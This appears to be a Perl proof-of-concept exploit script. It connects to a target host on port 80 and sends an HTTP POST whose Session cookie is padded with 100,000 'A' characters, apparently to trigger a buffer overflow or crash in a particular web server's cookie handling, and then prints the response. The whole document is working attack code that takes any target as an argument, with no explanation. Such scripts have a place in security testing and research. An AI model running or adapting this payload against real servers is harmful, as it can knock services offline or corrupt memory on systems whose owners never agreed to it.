use IO::Socket;

$|=1;
$a = "A" x 100000;
my $sock = IO::Socket::INET->new(PeerAddr => $ARGV[0],
                              PeerPort => '80',
                              Proto    => 'tcp');                             

print $sock "POST / HTTP/1.1\r\n"
."Host: $ARGV[0]\r\n"
."Cookie: killmenothing; SULang=de%2CDE; themename=vista; Session=_d838591b3a6257b0111138e6ca76c2c2409fb287b1473aa463db7f202caa09361bd7f8948c8d1adf4bd4f6c1c198eb950754581406246bf8$a\r\n"
."Content-Type: multipart/form-data; boundary=---------------------------25249352331758\r\n"
."Content-Length: 0\r\n\r\n";

while (<$sock>) {
	print;
}

